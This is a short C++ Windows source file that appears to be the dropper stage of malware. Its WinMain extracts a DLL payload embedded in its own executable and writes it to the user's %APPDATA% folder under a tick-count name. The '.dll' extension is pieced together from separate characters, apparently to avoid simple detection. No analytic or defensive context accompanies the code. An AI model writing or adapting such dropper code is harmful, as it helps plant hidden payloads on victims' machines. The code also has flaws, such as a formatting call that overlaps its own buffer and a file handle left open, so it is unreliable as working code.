#include <Windows.h>
#include "tools.h"

INT WINAPI WinMain(HMODULE current, HMODULE previous, LPSTR cmd, INT show) {
	PBYTE module_base = PBYTE(Tools::GetImageBase());
	if (module_base != ERROR) {
		// extract payload from section move to %appdata% with random name
		DWORD module_size = NULL;
		PBYTE dll_memory = Tools::ExtractDllFile(module_base, &module_size);

		// move payload onto %appdata% with some random generated name
		DWORD bytes_written = NULL;
		WCHAR appdata_path[MAX_PATH];

		if (ExpandEnvironmentStringsW(TEXT("%APPDATA%"), appdata_path, MAX_PATH - 1) > 0) {
			wsprintfW(appdata_path, TEXT("%s\\%lu.%cl%c"), appdata_path, GetTickCount(), 'd', 'l');
			HANDLE new_file = CreateFileW(appdata_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (new_file != INVALID_HANDLE_VALUE) {
				WriteFile(new_file, dll_memory, module_size, &bytes_written, NULL);
			}
		}
	}
}